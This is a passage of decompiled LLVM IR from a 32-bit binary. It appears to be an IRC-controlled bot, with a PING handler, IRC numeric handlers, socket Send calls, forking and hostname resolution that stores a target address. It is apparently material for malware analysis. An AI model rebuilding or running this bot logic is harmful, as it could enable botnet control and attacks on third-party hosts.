  store i1 false, i1* @df, align 1
  store i32 %v4_804a663, i32* @edi, align 4
  %v3_804a67a = call i32 @_strlen(i8* %v3_804a663)
  %v7_804a681 = icmp ult i32 %storemerge11, %v3_804a67a
  store i1 %v7_804a681, i1* %cf.global-to-local, align 1
  br i1 %v7_804a681, label %dec_label_pc_804a64e, label %dec_label_pc_804a685

dec_label_pc_804a685:                             ; preds = %dec_label_pc_804a660
  %v4_804a685 = add i32 %stack_var_-28.1, 1
  %v9_804a688 = icmp ult i32 %v4_804a685, 10
  store i1 %v9_804a688, i1* %cf.global-to-local, align 1
  %v7_804a68c = icmp sgt i32 %v4_804a685, 10
  %.v4_804a685 = select i1 %v7_804a68c, i32 10, i32 %v4_804a685
  store i32 %v2_804a3a6, i32* %stack_var_-88, align 4
  %v0_804a6a2 = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_804a685, 4
  %v3_804a6a2 = add i32 %tmp, -80
  %v4_804a6a2 = add i32 %v3_804a6a2, %v0_804a6a2
  %v5_804a6a2 = inttoptr i32 %v4_804a6a2 to i32*
  store i32 ptrtoint (i32* @global_var_805b0ab.107 to i32), i32* %v5_804a6a2, align 4
  %tmp81 = bitcast i8** %stack_var_-32 to i32*
  %v3_804a74c.pre = load i8*, i8** %stack_var_-32, align 4
  %v4_804a74c99 = ptrtoint i8* %v3_804a74c.pre to i32
  %v2_804a74f100 = load i8, i8* %v3_804a74c.pre, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804a751104 = icmp eq i8 %v2_804a74f100, 0
  %v1_804a753105 = icmp eq i1 %v4_804a751104, false
  br i1 %v1_804a753105, label %dec_label_pc_804a6b6, label %dec_label_pc_804a759

dec_label_pc_804a6b6:                             ; preds = %dec_label_pc_804a685, %dec_label_pc_804a702
  %v4_804a74c107 = phi i32 [ %v6_804a749, %dec_label_pc_804a702 ], [ %v4_804a74c99, %dec_label_pc_804a685 ]
  %stack_var_-24.0106 = phi i32 [ %v4_804a743, %dec_label_pc_804a702 ], [ 1, %dec_label_pc_804a685 ]
  %v5_804a6b6 = add i32 %v4_804a74c107, 1
  %v22_804a6b6 = inttoptr i32 %v5_804a6b6 to i8*
  store i8* %v22_804a6b6, i8** %stack_var_-32, align 4
  %v10_804a6bc = icmp ult i32 %stack_var_-24.0106, %.v4_804a685
  store i1 %v10_804a6bc, i1* %cf.global-to-local, align 1
  %v5_804a6bf = icmp slt i32 %stack_var_-24.0106, %.v4_804a685
  br i1 %v5_804a6bf, label %dec_label_pc_804a6d1, label %dec_label_pc_804a759

dec_label_pc_804a6ce:                             ; preds = %dec_label_pc_804a6f6
  %v4_804a6ce = add i32 %storemerge10, 1
  br label %dec_label_pc_804a6d1

dec_label_pc_804a6d1:                             ; preds = %dec_label_pc_804a6b6, %dec_label_pc_804a6ce
  %v3_804a6d4 = phi i8* [ %v4_804a6f9, %dec_label_pc_804a6ce ], [ %v22_804a6b6, %dec_label_pc_804a6b6 ]
  %storemerge10 = phi i32 [ %v4_804a6ce, %dec_label_pc_804a6ce ], [ 0, %dec_label_pc_804a6b6 ]
  store i32 %storemerge10, i32* %edx.global-to-local, align 4
  %v4_804a6d4 = ptrtoint i8* %v3_804a6d4 to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_804a6d4, i32* @edi, align 4
  %v3_804a6eb = call i32 @_strlen(i8* %v3_804a6d4)
  %v4_804a6eb = mul i32 %v3_804a6eb, -1
  %v5_804a6eb = add i32 %v4_804a6eb, -2
  store i32 %v5_804a6eb, i32* @ecx, align 4
  %v1_804a6f1 = sub i32 0, %v4_804a6eb
  %v0_804a6f2 = load i32, i32* %edx.global-to-local, align 4
  %v7_804a6f2 = icmp ult i32 %v0_804a6f2, %v1_804a6f1
  store i1 %v7_804a6f2, i1* %cf.global-to-local, align 1
  %v1_804a6f4 = icmp eq i1 %v7_804a6f2, false
  br i1 %v1_804a6f4, label %dec_label_pc_804a702, label %dec_label_pc_804a6f6

dec_label_pc_804a6f6:                             ; preds = %dec_label_pc_804a6d1
  %v4_804a6f9 = load i8*, i8** %stack_var_-32, align 4
  %v5_804a6f9 = ptrtoint i8* %v4_804a6f9 to i32
  %v6_804a6f9 = add i32 %v5_804a6f9, %storemerge10
  %v11_804a6f9 = icmp ult i32 %v6_804a6f9, %storemerge10
  store i1 %v11_804a6f9, i1* %cf.global-to-local, align 1
  %v1_804a6fc = inttoptr i32 %v6_804a6f9 to i8*
  %v2_804a6fc = load i8, i8* %v1_804a6fc, align 1
  %v3_804a6fe = icmp ult i8 %v2_804a6fc, 32
  store i1 %v3_804a6fe, i1* %cf.global-to-local, align 1
  %v7_804a6fe = icmp eq i8 %v2_804a6fc, 32
  %v1_804a700 = icmp eq i1 %v7_804a6fe, false
  br i1 %v1_804a700, label %dec_label_pc_804a6ce, label %dec_label_pc_804a702

dec_label_pc_804a702:                             ; preds = %dec_label_pc_804a6f6, %dec_label_pc_804a6d1
  store i32 %stack_var_-24.0106, i32* @ebx, align 4
  %v1_804a708 = add i32 %storemerge10, 1
  %v0_804a709 = load i32, i32* @esp, align 4
  %v5_804a709 = icmp ult i32 %v0_804a709, 12
  store i1 %v5_804a709, i1* %cf.global-to-local, align 1
  %v1_804a70d = call i32 @malloc(i32 %v1_804a708)
  %v1_804a715 = load i32, i32* @ebp, align 4
  %v2_804a715 = load i32, i32* @ebx, align 4
  %v3_804a715 = mul i32 %v2_804a715, 4
  %v4_804a715 = add i32 %v1_804a715, -84
  %v5_804a715 = add i32 %v4_804a715, %v3_804a715
  %v6_804a715 = inttoptr i32 %v5_804a715 to i32*
  store i32 %v1_804a70d, i32* %v6_804a715, align 4
  store i32 %storemerge10, i32* %edx.global-to-local, align 4
  %v0_804a71f = load i32, i32* @ebp, align 4
  %v2_804a71f = mul nuw nsw i32 %stack_var_-24.0106, 4
  %v3_804a71f = add nuw nsw i32 %v2_804a71f, -84
  %v4_804a71f = add i32 %v0_804a71f, %v3_804a71f
  %v5_804a71f = inttoptr i32 %v4_804a71f to i32*
  %v6_804a71f = load i32, i32* %v5_804a71f, align 4
  %v0_804a723 = load i32, i32* @esp, align 4
  %v5_804a723 = icmp ult i32 %v0_804a723, 4
  store i1 %v5_804a723, i1* %cf.global-to-local, align 1
  %v3_804a7279 = load i32, i32* %tmp81, align 4
  %v5_804a72b = inttoptr i32 %v6_804a71f to i8*
  %v6_804a72b = call i32 @strncpy(i8* %v5_804a72b, i32 %v3_804a7279, i32 %storemerge10)
  %v0_804a736 = load i32, i32* @ebp, align 4
  %v4_804a736 = add i32 %v0_804a736, %v3_804a71f
  %v5_804a736 = inttoptr i32 %v4_804a736 to i32*
  %v6_804a736 = load i32, i32* %v5_804a736, align 4
  store i32 %v6_804a736, i32* %edx.global-to-local, align 4
  %v2_804a73d = add i32 %v6_804a736, %storemerge10
  %v1_804a740 = inttoptr i32 %v2_804a73d to i8*
  store i8 0, i8* %v1_804a740, align 1
  %v4_804a743 = add nuw nsw i32 %stack_var_-24.0106, 1
  %v3_804a749 = load i8*, i8** %stack_var_-32, align 4
  %v4_804a749 = ptrtoint i8* %v3_804a749 to i32
  %v6_804a749 = add i32 %v4_804a749, %storemerge10
  %v11_804a749 = icmp ult i32 %v6_804a749, %v4_804a749
  store i1 %v11_804a749, i1* %cf.global-to-local, align 1
  %v26_804a749 = inttoptr i32 %v6_804a749 to i8*
  store i8* %v26_804a749, i8** %stack_var_-32, align 4
  %v2_804a74f = load i8, i8* %v26_804a749, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804a751 = icmp eq i8 %v2_804a74f, 0
  %v1_804a753 = icmp eq i1 %v4_804a751, false
  br i1 %v1_804a753, label %dec_label_pc_804a6b6, label %dec_label_pc_804a759

dec_label_pc_804a759:                             ; preds = %dec_label_pc_804a702, %dec_label_pc_804a6b6, %dec_label_pc_804a685
  %v4_804a7d0 = load i32, i32* bitcast ([8 x i8]** @global_var_805e240.109 to i32*), align 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804a7d7 = icmp eq i32 %v4_804a7d0, 0
  %v1_804a7d9 = icmp eq i1 %v1_804a7d7, false
  br i1 %v1_804a7d9, label %dec_label_pc_804a762, label %dec_label_pc_804a7db

dec_label_pc_804a762:                             ; preds = %dec_label_pc_804a759
  store i32 %v4_804a7d0, i32* %edx.global-to-local, align 4
  %v0_804a76c = load i32, i32* @esp, align 4
  %v5_804a76c = icmp ult i32 %v0_804a76c, 8
  store i1 %v5_804a76c, i1* %cf.global-to-local, align 1
  %v3_804a777 = inttoptr i32 %v4_804a7d0 to i8*
  %v4_804a777 = call i32 @__GI_strcasecmp(i8* %v3_804a777, i32 %v2_804a3a6)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804a786 = load i32, i32* @global_var_805e244.110, align 4
  store i32 %v4_804a786, i32* @ecx, align 4
  %v1_804a790 = add i32 %.v4_804a685, -1
  store i32 %v1_804a790, i32* %edx.global-to-local, align 4
  %v2_804a791 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_804a791, i32* %stack_var_-2208, align 4
  call void @__pseudo_call(i32 %v4_804a786)
  %v10_804a7c391 = icmp ugt i32 %.v4_804a685, 1
  store i1 %v10_804a7c391, i1* %cf.global-to-local, align 1
  %v5_804a7c697 = icmp sgt i32 %.v4_804a685, 1
  br i1 %v5_804a7c697, label %dec_label_pc_804a7aa.lr.ph, label %dec_label_pc_804a7db

dec_label_pc_804a7aa.lr.ph:                       ; preds = %dec_label_pc_804a762
  %v5_804a7b1 = icmp ult i32* %stack_var_-2208, inttoptr (i32 12 to i32*)
  br label %dec_label_pc_804a7aa

dec_label_pc_804a7aa:                             ; preds = %dec_label_pc_804a7aa.lr.ph, %dec_label_pc_804a7aa
  %storemerge98 = phi i32 [ 1, %dec_label_pc_804a7aa.lr.ph ], [ %v4_804a7bd, %dec_label_pc_804a7aa ]
  %v0_804a7ad = load i32, i32* @ebp, align 4
  %v2_804a7ad = mul nuw nsw i32 %storemerge98, 4
  %v3_804a7ad = add nuw nsw i32 %v2_804a7ad, -84
  %v4_804a7ad = add i32 %v3_804a7ad, %v0_804a7ad
  %v5_804a7ad = inttoptr i32 %v4_804a7ad to i32*
  %v6_804a7ad = load i32, i32* %v5_804a7ad, align 4
  store i1 %v5_804a7b1, i1* %cf.global-to-local, align 1
  %v1_804a7b5 = call i32 @free(i32 %v6_804a7ad)
  %v4_804a7bd = add nuw nsw i32 %storemerge98, 1
  %v10_804a7c3 = icmp ult i32 %v4_804a7bd, %.v4_804a685
  store i1 %v10_804a7c3, i1* %cf.global-to-local, align 1
  %v5_804a7c6 = icmp slt i32 %v4_804a7bd, %.v4_804a685
  br i1 %v5_804a7c6, label %dec_label_pc_804a7aa, label %dec_label_pc_804a7db

dec_label_pc_804a7db:                             ; preds = %dec_label_pc_804a762, %dec_label_pc_804a7aa, %dec_label_pc_804a759, %dec_label_pc_804a4ff, %dec_label_pc_804a407, %dec_label_pc_804a38a, %dec_label_pc_804a374
  %v0_804a7e2 = phi i32 [ %v4_804a7d0, %dec_label_pc_804a759 ], [ %v1_804a505, %dec_label_pc_804a4ff ], [ %v4_804a41c, %dec_label_pc_804a407 ], [ %v4_804a396, %dec_label_pc_804a38a ], [ %v6_804a380, %dec_label_pc_804a374 ], [ 1, %dec_label_pc_804a762 ], [ %.v4_804a685, %dec_label_pc_804a7aa ]
  ret i32 %v0_804a7e2

; uselistorder directives
  uselistorder i32 %v4_804a7bd, { 1, 0, 2 }
  uselistorder i32 %storemerge98, { 1, 0 }
  uselistorder i32 %v6_804a749, { 1, 2, 0 }
  uselistorder i32 %v4_804a749, { 1, 0 }
  uselistorder i8* %v4_804a6f9, { 1, 0 }
  uselistorder i32 %storemerge10, { 0, 1, 2, 3, 4, 7, 5, 8, 6 }
  uselistorder i8* %v3_804a6d4, { 1, 0 }
  uselistorder i32 %stack_var_-24.0106, { 4, 3, 2, 0, 1 }
  uselistorder i32 %.v4_804a685, { 1, 7, 8, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %storemerge11, { 0, 4, 1, 3, 2 }
  uselistorder i8* %v3_804a663, { 1, 0 }
  uselistorder i32 %v4_804a63a, { 2, 1, 0 }
  uselistorder i8* %v22_804a637, { 0, 2, 1 }
  uselistorder i8* %v3_804a616115, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 %v1_804a609, { 1, 2, 0 }
  uselistorder i32* %v1_804a5c8, { 1, 0 }
  uselistorder i1 %v5_804a5c2, { 2, 1, 4, 3, 0 }
  uselistorder i32 %v4_804a55b, { 1, 0, 2 }
  uselistorder i1 %v0_804a4e8, { 1, 0 }
  uselistorder i32 %v7_804a4e6, { 1, 0 }
  uselistorder i1 %v0_804a468, { 1, 0 }
  uselistorder i32 %.pre131, { 1, 0, 2 }
  uselistorder i32 %storemerge14, { 2, 1, 4, 0, 5, 3 }
  uselistorder i1 %v5_804a3b1, { 0, 4, 3, 2, 1 }
  uselistorder i32 %.pre38, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge15, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 %.pre, { 0, 1, 4, 3, 2 }
  uselistorder i32 %storemerge16, { 3, 1, 0, 4, 2 }
  uselistorder i32* %stack_var_-2204, { 1, 2, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i8** %stack_var_-32, { 19, 18, 17, 16, 1, 3, 15, 14, 13, 0, 12, 11, 10, 9, 8, 2, 7, 6, 5, 4 }
  uselistorder i1* %cf.global-to-local, { 1, 0, 62, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 63, 13, 16, 14, 15, 19, 17, 18, 64, 20, 21, 26, 27, 22, 23, 24, 25, 66, 65, 28, 29, 30, 31, 32, 33, 39, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32*)* @feof, { 1, 0 }
  uselistorder [2 x i8]* @global_var_805a33f.34, { 1, 0 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 1, 0 }
  uselistorder i32 (i32)* @mfork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([30 x i8]* @global_var_805a321.29 to i32), { 1, 2, 0 }
  uselistorder i8* @global_var_8062a84.27, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 0, 5, 1, 2, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a7db, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804a7aa, { 1, 0 }
  uselistorder label %dec_label_pc_804a6d1, { 1, 0 }
  uselistorder label %dec_label_pc_804a6b6, { 1, 0 }
  uselistorder label %dec_label_pc_804a660, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804a65d, { 1, 0 }
  uselistorder label %dec_label_pc_804a616, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a568, { 1, 0 }
  uselistorder label %dec_label_pc_804a4b6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a407, { 1, 0 }
  uselistorder label %dec_label_pc_804a3d6, { 1, 0 }
  uselistorder label %dec_label_pc_804a343, { 1, 0 }
  uselistorder label %dec_label_pc_804a2eb, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804a7fa = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805b0ad.111 to i32))
  %v3_804a817 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805b0ba.113 to i32))
  %v3_804a830 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_805b0c7.114 to i32))
  ret i32 %v3_804a830

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804a84e = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_805b0cf.115 to i32))
  ret i32 %v3_804a84e
}

define i32 @_352(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_804a87c.preheader

dec_label_pc_804a876:                             ; preds = %dec_label_pc_804a89b
  %v5_804a876 = add i32 %.pre36, 1
  %v22_804a876 = inttoptr i32 %v5_804a876 to i8*
  %v4_804a879 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804a87c

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a87c.preheader, %dec_label_pc_804a876
  %stack_var_-28.0 = phi i32 [ %v4_804a879, %dec_label_pc_804a876 ], [ %stack_var_-28.169, %dec_label_pc_804a87c.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_804a876, %dec_label_pc_804a876 ], [ %stack_var_-20.170, %dec_label_pc_804a87c.preheader ]
  %v3_804a890 = call i32 @_strlen(i8* %arg2)
  %v7_804a897 = icmp ult i32 %stack_var_-28.0, %v3_804a890
  %v1_804a899 = icmp eq i1 %v7_804a897, false
  %.pre36 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_804a899, label %dec_label_pc_804a8a4, label %dec_label_pc_804a89b

dec_label_pc_804a89b:                             ; preds = %dec_label_pc_804a87c
  %v2_804a89e = load i8, i8* %stack_var_-20.0, align 1
  %v7_804a8a0 = icmp eq i8 %v2_804a89e, 32
  %v1_804a8a2 = icmp eq i1 %v7_804a8a0, false
  br i1 %v1_804a8a2, label %dec_label_pc_804a876, label %dec_label_pc_804a8a4

dec_label_pc_804a8a4:                             ; preds = %dec_label_pc_804a87c, %dec_label_pc_804a89b
  %v5_804a8a4 = add i32 %.pre36, 1
  %v3_804a8bb = call i32 @_strlen(i8* %arg2)
  %v4_804a8bb = mul i32 %v3_804a8bb, -1
  %v1_804a8c1 = sub i32 0, %v4_804a8bb
  %v2_804a8c2 = sub i32 0, %v4_804a8bb
  %v12_804a8c2 = icmp eq i32 %stack_var_-28.0, %v2_804a8c2
  br i1 %v12_804a8c2, label %dec_label_pc_804aa97, label %dec_label_pc_804a8ca

dec_label_pc_804a8ca:                             ; preds = %dec_label_pc_804a8a4
  %v22_804a8a4 = inttoptr i32 %v5_804a8a4 to i8*
  %v4_804a8ca = add nuw nsw i32 %storemerge1171, 1
  %v7_804a8d1 = icmp sgt i32 %storemerge1171, 3
  br i1 %v7_804a8d1, label %dec_label_pc_804a8df.preheader, label %dec_label_pc_804a87c.preheader

dec_label_pc_804a87c.preheader:                   ; preds = %entry, %dec_label_pc_804a8ca
  %storemerge1171 = phi i32 [ 0, %entry ], [ %v4_804a8ca, %dec_label_pc_804a8ca ]
  %stack_var_-20.170 = phi i8* [ %arg2, %entry ], [ %v22_804a8a4, %dec_label_pc_804a8ca ]
  %stack_var_-28.169 = phi i32 [ 0, %entry ], [ %stack_var_-28.0, %dec_label_pc_804a8ca ]
  br label %dec_label_pc_804a87c

dec_label_pc_804a8df.preheader:                   ; preds = %dec_label_pc_804a8ca
  br label %dec_label_pc_804a8df

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8fe
  %v4_804a8dc = add i32 %storemerge10, 1
  br label %dec_label_pc_804a8df

dec_label_pc_804a8df:                             ; preds = %dec_label_pc_804a8df.preheader, %dec_label_pc_804a8dc
  %storemerge10 = phi i32 [ %v4_804a8dc, %dec_label_pc_804a8dc ], [ 0, %dec_label_pc_804a8df.preheader ]
  %v3_804a8f3 = call i32 @_strlen(i8* %v22_804a8a4)
  %v7_804a8fa = icmp ult i32 %storemerge10, %v3_804a8f3
  %v1_804a8fc = icmp eq i1 %v7_804a8fa, false
  %.pre = add i32 %storemerge10, %v5_804a8a4
  br i1 %v1_804a8fc, label %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge, label %dec_label_pc_804a8fe

dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge: ; preds = %dec_label_pc_804a8df
  %.pre25 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804a90a

dec_label_pc_804a8fe:                             ; preds = %dec_label_pc_804a8df
  %v1_804a904 = inttoptr i32 %.pre to i8*
  %v2_804a904 = load i8, i8* %v1_804a904, align 1
  %v7_804a906 = icmp eq i8 %v2_804a904, 32
  %v1_804a908 = icmp eq i1 %v7_804a906, false
  br i1 %v1_804a908, label %dec_label_pc_804a8dc, label %dec_label_pc_804a90a

dec_label_pc_804a90a:                             ; preds = %dec_label_pc_804a8fe, %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge
  %v1_804a910.pre-phi = phi i8* [ %.pre25, %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge ], [ %v1_804a904, %dec_label_pc_804a8fe ]
  store i8 0, i8* %v1_804a910.pre-phi, align 1
  %v0_804a913 = load i32, i32* @global_var_8067524.101, align 4
  %v3_804a91f = call i32 @__GI_strcasecmp(i8* %v22_804a8a4, i32 %v0_804a913)
  %v1_804a927 = icmp eq i32 %v3_804a91f, 0
  %v1_804a929 = icmp eq i1 %v1_804a927, false
  br i1 %v1_804a929, label %dec_label_pc_804aa97, label %dec_label_pc_804a92f

dec_label_pc_804a92f:                             ; preds = %dec_label_pc_804a90a
  %v0_804a92f = load i64, i64* @global_var_8062a8c.33, align 8
  %v1_804a92f = trunc i64 %v0_804a92f to i32
  %v1_804a934 = icmp eq i32 %v1_804a92f, 0
  %v1_804a936 = icmp eq i1 %v1_804a934, false
  br i1 %v1_804a936, label %dec_label_pc_804aa97, label %dec_label_pc_804a93c

dec_label_pc_804a93c:                             ; preds = %dec_label_pc_804a92f
  br label %dec_label_pc_804a958.preheader

dec_label_pc_804a952:                             ; preds = %dec_label_pc_804a977
  %v5_804a952 = add i32 %.pre35, 1
  %v22_804a952 = inttoptr i32 %v5_804a952 to i8*
  %v4_804a955 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_804a958

dec_label_pc_804a958:                             ; preds = %dec_label_pc_804a958.preheader, %dec_label_pc_804a952
  %stack_var_-28.2 = phi i32 [ %v4_804a955, %dec_label_pc_804a952 ], [ %stack_var_-28.366, %dec_label_pc_804a958.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_804a952, %dec_label_pc_804a952 ], [ %stack_var_-20.367, %dec_label_pc_804a958.preheader ]
  %v3_804a96c = call i32 @_strlen(i8* %arg2)
  %v7_804a973 = icmp ult i32 %stack_var_-28.2, %v3_804a96c
  %v1_804a975 = icmp eq i1 %v7_804a973, false
  %.pre35 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_804a975, label %dec_label_pc_804a980, label %dec_label_pc_804a977

dec_label_pc_804a977:                             ; preds = %dec_label_pc_804a958
  %v2_804a97a = load i8, i8* %stack_var_-20.2, align 1
  %v7_804a97c = icmp eq i8 %v2_804a97a, 32
  %v1_804a97e = icmp eq i1 %v7_804a97c, false
  br i1 %v1_804a97e, label %dec_label_pc_804a952, label %dec_label_pc_804a980

dec_label_pc_804a980:                             ; preds = %dec_label_pc_804a958, %dec_label_pc_804a977
  %v5_804a980 = add i32 %.pre35, 1
  %v3_804a997 = call i32 @_strlen(i8* %arg2)
  %v4_804a997 = mul i32 %v3_804a997, -1
  %v1_804a99d = sub i32 0, %v4_804a997
  %v2_804a99e = sub i32 0, %v4_804a997
  %v12_804a99e = icmp eq i32 %stack_var_-28.2, %v2_804a99e
  br i1 %v12_804a99e, label %dec_label_pc_804aa97, label %dec_label_pc_804a9a6

dec_label_pc_804a9a6:                             ; preds = %dec_label_pc_804a980
  %v22_804a980 = inttoptr i32 %v5_804a980 to i8*
  %v4_804a9a6 = add nuw nsw i32 %storemerge968, 1
  %v7_804a9ad = icmp sgt i32 %storemerge968, 1
  br i1 %v7_804a9ad, label %dec_label_pc_804a9bb.preheader, label %dec_label_pc_804a958.preheader

dec_label_pc_804a958.preheader:                   ; preds = %dec_label_pc_804a93c, %dec_label_pc_804a9a6
  %storemerge968 = phi i32 [ 0, %dec_label_pc_804a93c ], [ %v4_804a9a6, %dec_label_pc_804a9a6 ]
  %stack_var_-20.367 = phi i8* [ %arg2, %dec_label_pc_804a93c ], [ %v22_804a980, %dec_label_pc_804a9a6 ]
  %stack_var_-28.366 = phi i32 [ 0, %dec_label_pc_804a93c ], [ %stack_var_-28.2, %dec_label_pc_804a9a6 ]
  br label %dec_label_pc_804a958

dec_label_pc_804a9bb.preheader:                   ; preds = %dec_label_pc_804a9a6
  br label %dec_label_pc_804a9bb

dec_label_pc_804a9b8:                             ; preds = %dec_label_pc_804a9da
  %v4_804a9b8 = add i32 %storemerge, 1
  br label %dec_label_pc_804a9bb

dec_label_pc_804a9bb:                             ; preds = %dec_label_pc_804a9bb.preheader, %dec_label_pc_804a9b8
  %storemerge = phi i32 [ %v4_804a9b8, %dec_label_pc_804a9b8 ], [ 0, %dec_label_pc_804a9bb.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804a980, i32* @edi, align 4
  %v3_804a9cf = call i32 @_strlen(i8* %v22_804a980)
  %v0_804a9d6 = load i32, i32* @edx, align 4
  %v7_804a9d6 = icmp ult i32 %v0_804a9d6, %v3_804a9cf
  %v1_804a9d8 = icmp eq i1 %v7_804a9d6, false
  %.pre26 = add i32 %storemerge, %v5_804a980
  br i1 %v1_804a9d8, label %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge, label %dec_label_pc_804a9da

dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge: ; preds = %dec_label_pc_804a9bb
  %.pre33 = inttoptr i32 %.pre26 to i8*
  br label %dec_label_pc_804a9e6

dec_label_pc_804a9da:                             ; preds = %dec_label_pc_804a9bb
  %v1_804a9e0 = inttoptr i32 %.pre26 to i8*
  %v2_804a9e0 = load i8, i8* %v1_804a9e0, align 1
  %v7_804a9e2 = icmp eq i8 %v2_804a9e0, 32
  %v1_804a9e4 = icmp eq i1 %v7_804a9e2, false
  br i1 %v1_804a9e4, label %dec_label_pc_804a9b8, label %dec_label_pc_804a9e6

dec_label_pc_804a9e6:                             ; preds = %dec_label_pc_804a9da, %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge
  %v1_804a9ec.pre-phi = phi i8* [ %.pre33, %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge ], [ %v1_804a9e0, %dec_label_pc_804a9da ]
  store i8 0, i8* %v1_804a9ec.pre-phi, align 1
  %v1_804a9f5 = call i32 @inet_addr(i32 %v5_804a980)
  %v2_804a9f5 = trunc i32 %v1_804a9f5 to i8
  store i8 %v2_804a9f5, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_804a9f5, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804aa06 = icmp eq i1 %tmp, false
  br i1 %v1_804aa06, label %dec_label_pc_804a9e6._crit_edge, label %dec_label_pc_804aa08

dec_label_pc_804a9e6._crit_edge:                  ; preds = %dec_label_pc_804a9e6
  br label %bb

dec_label_pc_804aa08:                             ; preds = %dec_label_pc_804a9e6
  %v1_804aa0e = call i32 @__GI_gethostbyname(i32 %v5_804a980)
  %v4_804aa19 = icmp eq i32 %v1_804aa0e, 0
  %v1_804aa1d = icmp eq i1 %v4_804aa19, false
  br i1 %v1_804aa1d, label %dec_label_pc_804aa3a, label %dec_label_pc_804aa1f

dec_label_pc_804aa1f:                             ; preds = %dec_label_pc_804aa08
  %v2_804aa30 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_805b0d8.116 to i32))
  br label %dec_label_pc_804aa97

dec_label_pc_804aa3a:                             ; preds = %dec_label_pc_804aa08
  %v1_804aa3d = add i32 %v1_804aa0e, 12
  %v2_804aa3d = inttoptr i32 %v1_804aa3d to i32*
  %v3_804aa3d = load i32, i32* %v2_804aa3d, align 4
  %v1_804aa45 = add i32 %v1_804aa0e, 16
  %v2_804aa45 = inttoptr i32 %v1_804aa45 to i32*
  %v3_804aa45 = load i32, i32* %v2_804aa45, align 4
  %v1_804aa48 = inttoptr i32 %v3_804aa45 to i32*
  %v2_804aa48 = load i32, i32* %v1_804aa48, align 4
  %v1_804aa4f = inttoptr i32 %v2_804aa48 to i8*
  %v7_804aa52 = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_804aa4f, i32 %v3_804aa3d)
  %v2_804aa5f.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_804a9e6._crit_edge, %dec_label_pc_804aa3a
  %v2_804aa5f = phi i8 [ %v2_804a9f5, %dec_label_pc_804a9e6._crit_edge ], [ %v2_804aa5f.pre, %dec_label_pc_804aa3a ]
  store i8 %v2_804aa5f, i8* bitcast (i8** @global_var_8062a8b.117 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8062a88.32 to i8*), align 4
  store i64 256, i64* @global_var_8062a8c.33, align 8
  br label %dec_label_pc_804aa97

dec_label_pc_804aa97:                             ; preds = %dec_label_pc_804a8a4, %dec_label_pc_804a980, %dec_label_pc_804a92f, %dec_label_pc_804a90a, %dec_label_pc_804aa1f, %bb
  %v0_804aa9d = phi i32 [ %v1_804a92f, %dec_label_pc_804a92f ], [ %v3_804a91f, %dec_label_pc_804a90a ], [ %v2_804aa30, %dec_label_pc_804aa1f ], [ ptrtoint (i8** @global_var_8062a88.32 to i32), %bb ], [ %v1_804a99d, %dec_label_pc_804a980 ], [ %v1_804a8c1, %dec_label_pc_804a8a4 ]
  ret i32 %v0_804aa9d

; uselistorder directives
  uselistorder i32 %.pre26, { 1, 0 }
